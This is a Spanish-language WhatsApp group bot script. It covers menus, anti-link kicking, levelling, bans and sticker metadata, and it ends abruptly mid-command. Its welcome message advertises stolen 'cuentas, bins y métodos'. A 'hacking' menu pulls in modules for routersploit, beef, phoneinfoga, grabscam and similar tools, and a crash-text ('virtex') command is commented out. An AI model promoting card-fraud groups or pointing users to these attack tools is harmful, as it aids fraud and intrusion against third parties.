 /*
* ShanBot es una creación de shanduy
* ShanBot no tiene ningun fin de lucro
* shanduy se reserva todos los derechos de autor
* © 2021 shanduy, INC.

Cualquier copia que utilize mi ApiKey sera dado de baja

- Que hay de nuevo?
* Nada
*/

const {
    WAConnection,
    MessageType,
    ReconnectMode,
    Presence,
    Mimetype,
    rugaapi,
    GroupSettingChange
} = require('@adiwajshing/baileys')

/******COMIENZO DE LA ENTRADA DEL ARCHIVO******/
const { color, bgcolor } = require('./lib/color')
const { bahasa } = require('./src/bahasa')
const { negara } = require('./src/kodenegara')
const { virtex } = require('./src/virtex')
const { wait, pegatinas, musica, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
/******FIN DE ENTRADA DE ARCHIVO******/

/******COMIENZO DE LA ENTRADA DEL PAQUETE NPM******/
const fs = require('fs')
const moment = require('moment-timezone')
const { exec } = require('child_process')
const kagApi = require('@kagchi/kag-api')
const axios = require("axios")
const fetch = require('node-fetch')
/*const tiktod = require('tiktok-scraper')*/
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
/*const imgbb = require('imgbb-uploader')*/
const lolis = require('lolis.life')
const loli = new lolis()
const speed = require('performance-now')
/******FIN DE ENTRADA DEL PAQUETE NPM******/

/******COMIENZO DE LA ENTRADA JSON******/
const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/json/nsfw.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
const samih = JSON.parse(fs.readFileSync('./database/json/simi.json'))
const user = JSON.parse(fs.readFileSync('./database/json/user.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/json/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/json/level.json'))
/******FIN DE ENTRADA JSON******/

/******INICIO DE LA ENTRADA DEL MENÚ******/
const { help } = require('./src/help')
const { logomaker } = require('./database/menu/logomaker')
const { toinmenu } = require('./src/toinmenu')
const { menuadmin } = require('./src/menuadmin')
const { nsfwmenu } = require('./src/nsfwmenu')
const { desmenu } = require('./src/desmenu')
const { version } = require('./src/version')
const { fbDown } = require('./lib/fb.js')
const { juegos } = require('./src/juegos')
const { shantera } = require('./src/shantera')
const { antimenu } = require('./src/antimenu')
const { welmenu } = require('./src/welmenu')
const { banmenu } = require('./src/banmenu')
const { otak } = require('./src/otak')
const { levelmenu } = require('./src/levelmenu')
/********INICIO MENU HACKING********/
const { routersploit } = require('./src/routersploit')
const { infoga } = require('./src/infoga')
const { ngrok } = require('./src/ngrok')
const { phoneinfoga } = require('./src/phoneinfoga')
const { fotosploit } = require('./src/fotosploit')
const { beef } = require('./src/beef')
const { cupp } = require('./src/cupp')
const { grabscam } = require('./src/grabscam')
/******FIN DE ENTRADA DEL MENÚ******/

/******CARGA DE ENTRADA VCARD******/
const vcard = 'BEGIN:VCARD\n' // Tarjeta de contacto
            + 'VERSION:3.0\n' 
            + 'FN:𝐉𝐎𝐒𝐄𝐏𝐇-𝐁𝐎𝐓\n' // Nombre
            + 'ORG:ᝰJσʂҽρԋ᭄;\n' // Propietario
            + 'TEL;type=CELL;type=VOICE;waid=436703061433499:+43 670 3061433499\n' // ID de WhatsApp + número de teléfono
            + 'END:VCARD'
/******FIN DE ENTRADA VCARD******/

prefix = '/'
blocked = []
banChats = false

/******CONFIGURACION DE CARGA******/
const settingan = JSON.parse(fs.readFileSync('./admin/set.json'))
const {
	author,
	pack
} = settingan

/******INICIO DE FUNCIONES ENTRADA******/

/******ARCHIVOS ANTILINK POR SHANDUY******/

const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antiface = JSON.parse(fs.readFileSync('./src/antiface.json'))
const antitik = JSON.parse(fs.readFileSync('./src/antitik.json'))
const antinsta = JSON.parse(fs.readFileSync('./src/antinsta.json'))
const antikwai = JSON.parse(fs.readFileSync('./src/antikwai.json'))
const antiwa = JSON.parse(fs.readFileSync('./src/antiwa.json'))
const antidiscord = JSON.parse(fs.readFileSync('./src/antidiscord.json'))

/******FIN DE ARCHIVOS ANTILINK POR SHANDUY******/


//LEVEL INICIO
const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
            }
        }

        const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
        }
//LEVEL FIN
	
function addMetadata(packname, author) {	
	if (!packname) packname = 'ShanBot'; if (!author) author = 'shanduy';	
	author = author.replace(/[^a-zA-Z0-9]/g, '');	
	let name = `${author}_${packname}`
	if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
	const json = {	
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}
	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

	let len = JSON.stringify(json).length	
	let last	

	if (len > 256) {	
		len = len - 256	
		bytes.unshift(0x01)	
	} else {	
		bytes.unshift(0x00)	
	}	

	if (len < 16) {	
		last = len.toString(16)	
		last = "0" + len	
	} else {	
		last = len.toString(16)	
	}	

	const buf2 = Buffer.from(last, "hex")	
	const buf3 = Buffer.from(bytes)	
	const buf4 = Buffer.from(JSON.stringify(json))	

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

	fs.writeFile(`./${name}.exif`, buffer, (err) => {	
		return `./${name}.exif`	
	})	

} 
	
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}

async function starts() {
	const client = new WAConnection()
	client.version = [2, 2147, 14]
	client.autoReconnect = ReconnectMode.onConnectionLost;
        client.logger.level = 'warn'
	console.log(banner.string)
	client.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color('Escanea el codigo QR rapido!!!'))
	})

	fs.existsSync('./Nazwa.json') && client.loadAuthInfo('./Nazwa.json')
	client.on('connecting', () => {
		start('2', 'Estas desconectado')
	})
	client.on('open', () => {
		success('2', 'Conectado')
	})
	await client.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./Nazwa.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))

	client.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				teks = `Hola *@${num.split('@')[0]}* ✨\n\nBienvenido a: *${mdata.subject}* ✨\n\nGrupo en el que encontraras todo tipo de cuentas, bins y métodos ✨\n\nEspero disfrutes de tu estadía en este grupo ✨\nRecuerda leer las reglas del grupo para no tener ningún problema ✨`
                          client.sendMessage(mdata.id, teks, MessageType.text, { contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				teks = `Adios... *@${num.split('@')[0]}*`
				client.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error: %s', color(e, 'red'))
		}
	})

		client.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

	client.on('chat-update', async (mek) => {
		try {
                        if (!mek.hasNewMessage) return
                        mek = JSON.parse(JSON.stringify(mek)).messages[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const apikey = setting.apikey
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('America/Guayaquil').format('HH:mm:ss')
			const date = moment.tz('America/Guayaquil').format('DD/MM/YY')
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			let authorname = client.contacts[from] != undefined ? client.contacts[from].vname || client.contacts[from].notify : undefined
			const isCmd = body.startsWith(prefix)

			mess = {
				wait: 'Un momento por favor 🥴',
				success: '✔️ Listo ✔️',
                                levelon: '❬ ✅ ❭ Level activado',
				leveloff: ' ❬ ✅ ❭  Level desactivado',
				foto: 'Un momento por favor 🥴\n\nEstoy cambiando la foto del grupo 🦦\n\nPor favor no hacer spam\n\nMade in Joseph-Bot',
				unir: 'Un momento por favor 🥴\n\nEstoy tratando de unirlo 🦦\n\nRecuerda que, si no lo uno es por que el usuario tiene bloqueado la función para unirlo a grupos\n\nMade in Joseph-Bot',
                                levelnoton: '❬ ❎ ❭ Level no esta activado',
				levelnol: 'Nivel 0 ',
				error: {
					stick: '[❎] Falló, se produjo un error al convertir la imagen en una pegatina',
					yt: 'Falló en el link o se produjo un error al momento de descargar el video',
					unire: 'Por favor, no coloques (+) solo pon el numero con el codigo de area de su pais\n\nEjemplo: /unir 52xxxxxxxxx',
					Iv: 'Este no es un link de youtube',
					Fb: 'Este no es un link de facebook'
					},
				only: {
					group: '[❗] Este comando es solo para grupos',
					ownerG: '[❗] Este comando solo puede ser utilizado por un admins del grupo',
					ownerB: '[❗] Este comando solo lo usa Joseph',
					admin: '[❗] Este comando solo puede ser utilizado por administradores del grupo',
					Badmin: '[❗] Este comando solo se puede usar cuando el bot se convierte en administrador',
                                        pegatina: 'Un momento por favor 🥴\n\nRecuerda los stickersgif son de 6 segundos 🦦\n\nMade in Joseph-Bot',
					attp: 'Un momento por favor 🥴\n\nEsto puede demorar unos minutos 🦦\n\nMade in Joseph-Bot',
					imgs: 'Un momento por favor 🥴\n\nConvirtiendo tu Sticker a Imagen 🦦\n\nMade in Joseph-Bot',
					mpcancion: 'Un momento por favor 🥴\n\nConvirtiendo de MP4 a MP3 🦦\n\nMade in Joseph-Bot',
					mpa: 'Un momento por favor 🥴\n\nEstoy descargando tu cancion 🦦\n\nMade in Joseph-Bot',
                                        mpv: 'Un momento por favor 🥴\n\nEstoy descargando tu video 🦦\n\nMade in Joseph-Bot',
					insta: 'Un momento por favor 🥴\n\nEstoy descargando tu post 🦦\n\nMade in Joseph-Bot',
					musica: 'Un momento por favor 🥴\n\nRecuerda colocar bien el nombre de la cancion o el link del video de youtube\n\nSi el comando /play no funciona utiliza el comando /play2 🦦\n\nMade in Joseph-Bot',
					musica2: 'Un momento por favor 🥴\n\nRecuerda colocar bien el nombre de la cancion o el link del video de youtube\n\nSi el comando /play2 no funciona utiliza el comando /play 🦦\n\nMade in Joseph-Bot',
					daftarB: `「NO ESTAS REGISTRADO」\n\n[❗] NO APARECES EN MI BASE DE DATOS [❗]\n\nPara poder usarme escribe el siguente comando\n\nComando: ${prefix}daftar Nombre\nEjemplo: ${prefix}daftar Joseph`,
				}
			}
    			const apakah = ['Si','No']
                        const kapankah = ['Otro día','Otra semana','Otro mes','Otro año']
			const botNumber = client.user.jid
			const ownerNumber = ["436703061433499@s.whatsapp.net"] // replace this with your number
			const nomorOwner = [ownerNumber]
	                const isGroup = from.endsWith('@g.us')
			const totalchat = await client.chats.all()
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
			const isBanned = ban.includes(sender)
			const groupName = isGroup ? groupMetadata.subject : ''
			const isAntiLink = isGroup ? antilink.includes(from) : false
			const isAntiDiscord = isGroup ? antidiscord.includes(from) : false
			const isAntInsta = isGroup ? antinsta.includes(from) : false
			const isAntiTik = isGroup ? antitik.includes(from) : false
			const isAntiFace = isGroup ? antiface.includes(from) : false
			const isAntiKwai = isGroup ? antikwai.includes(from) : false
			const isAntiWa = isGroup ? antiwa.includes(from) : false
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
                        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
                        const isUser = user.includes(sender)
                        const isLevelingOn = isGroup ? _leveling.includes(groupId) : false
                        const NomerOwner = '436703061433499@s.whatsapp.net'
                        const conts = mek.key.fromMe ? client.user.jid : client.contacts[sender] || { notify: jid.replace(/@.+/, '') }
                        const pushname = mek.key.fromMe ? client.user.name : conts.notify || conts.vname || conts.name || '-'
			
			//......................
			
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				client.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
           
//LINKS DE WHATSAPP	

if (budy.includes("https://wa.me/")){
		if (!isGroup) return
		if (!isAntiWa) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Spam 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}
			
	if (budy.includes("wa.me")){
		if (!isGroup) return
		if (!isAntiWa) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Spam 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}
			
			
//FIN DE LINKS DE WHATSAPP	
			
			
//ANTILINKS FACEBOOK GRUPOS PERFILES PUBLICACIONES
			
if (budy.includes("https://www.facebook.com/")){
		if (!isGroup) return
		if (!isAntiFace) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Spam 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}			
			
if (budy.includes("https://m.facebook.com/")){
		if (!isGroup) return
		if (!isAntiFace) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Spam 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}
			
			
//FIN ANTILINKS FACEBOOK GRUPOS PERFILES PUBLICACIONES			
			
//FUNCION ANTILINK
	     	
	if (budy.includes("https://discord.com/")){
		if (!isGroup) return
		if (!isAntiDiscord) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Spam 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}
			
	if (budy.includes("https://s.kwai.app/")){
		if (!isGroup) return
		if (!isAntiKwai) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Kwai 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}
			
	if (budy.includes("https://www.instagram.com/")){
		if (!isGroup) return
		if (!isAntInsta) return
	        if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Undefined 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}		
	
	if (budy.includes("https://vm.tiktok.com/")){
		if (!isGroup) return
		if (!isAntiTik) return
                if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Tik Tok 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}
	
       if (budy.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply('Eres un administrador del grupo, así que no te eliminaré v:')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*Usted será eliminado del grupo ${sender.split("@")[0]}*\n\nRazón: Spam 🚮`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 0)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Grupo protegido por Joseph 🦦")
		}, 0)
	}

//FIN DE ANTI LINKS 
		

//FUNCION DE LEVEL
            
     if (isGroup && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await reply(`*「 FELICIDADES LEVEL UP 🆙🥳 」*\n\nFelicidades subiste de nivel sigue asi 👏\n\n*NOMBRE*\n${pushname}\n*XP*: ${getLevelingXp(sender)}\n*NIVEL*: ${getLevel} ⟿ ${getLevelingLevel(sender)}\n\n_*Para ver tu XP en tiempo real coloca el comando ${prefix}level*_`)
                }
            } catch (err) {
                console.error(err)
            }
        }

//FIN DE FUNCION DE LEVEL
			
         		
                        colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
         if (isCmd && isBanned) {
        return console.log(color('[ USUÁRIO BANEADO ] Ignorando Comando', 'blue'), color(moment.tz('America/Guayaquil').format('HH:mm:ss'), 'yellow'), color(`${command}`),'DE:', color(pushname))}
    	if (!isGroup && isCmd) console.log('\x1b[1;37m>', '[ \x1b[1;36mMensaje\x1b[1;37m ]', time, color(command), 'De', color(sender.split('@')[0]))
        if (isCmd && isGroup) console.log('\x1b[1;37m>', '[ \x1b[1;36mMensaje\x1b[1;37m ]', time, color(command), 'De', color(sender.split('@')[0]), 'En', color(groupName))

/******ENTRADA FIN DE FUNCIONES******/
			function addMetadata(packname, author) {	
				if (!packname) packname = 'ShanBot'; if (!author) author = 'Shanduy';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	
					return `./src/stickers/${name}.exif`	
				})	

			}
			switch(command) {
		case 'help':
		case 'menu':
	        client.sendMessage(from, help(prefix, sender), text, {quoted: mek})
		break
                case 'otak':
		client.sendMessage(from, otak(prefix, sender), text, {quoted: mek})
		break
		case 'juegos':
		client.sendMessage(from, juegos(prefix, sender), text, {quoted: mek})
		break
		case 'idioma':
		client.sendMessage(from, bahasa(prefix, sender), text, {quoted: mek})
		break
		case 'levelmenu':
		client.sendMessage(from, levelmenu(prefix, sender), text, {quoted: mek})
		break
		case 'shanmenu':
		client.sendMessage(from, toinmenu(prefix, sender), text, {quoted: mek})
		break
		case 'menuadmin':
		client.sendMessage(from, menuadmin(prefix, sender), text, {quoted: mek})
		break
		case 'nsfwmenu':
		client.sendMessage(from, nsfwmenu(prefix, sender), text, {quoted: mek})
		break
		case 'banmenu':
		client.sendMessage(from, banmenu(prefix, sender), text, {quoted: mek})
		break
		case 'desmenu':
		client.sendMessage(from, desmenu(prefix, sender), text, {quoted: mek})
		break
		case 'versión':
		case 'version':
		client.sendMessage(from, version(prefix, sender), text, {quoted: mek})
		break
		case 'antimenu':
		client.sendMessage(from, antimenu(prefix, sender), text, {quoted: mek})
		break
                case 'welmenu':
		client.sendMessage(from, welmenu(prefix, sender), text, {quoted: mek})
		break
		case 'shantera':
		client.sendMessage(from, shantera(prefix, sender), text, {quoted: mek})
		break
		case 'bineriauniversal':
		client.sendMessage(from, bineriauniversal(prefix, sender), text, {quoted: mek})
		break
		case 'akatsuki':
		client.sendMessage(from, akatsuki(prefix, sender), text, {quoted: mek})
		break
		case 'vpns':
		case 'vpn':
		client.sendMessage(from, vpns(prefix, sender), text, {quoted: mek})
		break
		case 'navegadores':
		client.sendMessage(from, navegadores(prefix, sender), text, {quoted: mek})
		break
		case 'shoppay':
		client.sendMessage(from, shoppay(prefix, sender), text, {quoted: mek})
		break
		

		case 'routersploit':
		client.sendMessage(from, routersploit(prefix, sender), text, {quoted: mek})
		break
					
		case 'infoga':
		client.sendMessage(from, infoga(prefix, sender), text, {quoted: mek})
		break
					
		case 'ngrok':
		client.sendMessage(from, ngrok(prefix, sender), text, {quoted: mek})
		break
					
		case 'phoneinfoga':
		client.sendMessage(from, phoneinfoga(prefix, sender), text, {quoted: mek})
		break
		case 'fotosploit':
		client.sendMessage(from, fotosploit(prefix, sender), text, {quoted: mek})
		break

		/*case 'virtex':
	       case 'troleo':
               client.sendMessage(from, virtex(prefix, sender), text, {quoted: mek})
               break*/
                            


//FUNCIONES DE BAN Y DESBAN			
			
case 'ban':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '*\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `『 BANEADO 🚫 』\n\n◉Nombre: @${mentioned[0].split('@')[0]}\n◉Razon: Spam\n\n*Usted a sido baneado del uso del bot, no podra usar el bot hasta nuevo aviso*`
mentions(`${susp}`, mentioned, true)   
break

case 'unban':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '*\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `『 DESBANEADO ✅ 』\n\n◉Nombre: @${mentioned[0].split('@')[0]}\n\n*Se te a retirado el BAN ya puedes usar el bot*`
mentions(`${susp}`, mentioned, true)   
break		
			
//FIN DE FUNCIONES BAN Y DESBAN					
					
					
/******JUEGOS SHANDUY LA PUTA MADRE NO TE OLVIDES******/
					
case 'gay':
if (!isUser) return reply(mess.only.daftarB)
rate = body.slice(5)
client.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
gay = random
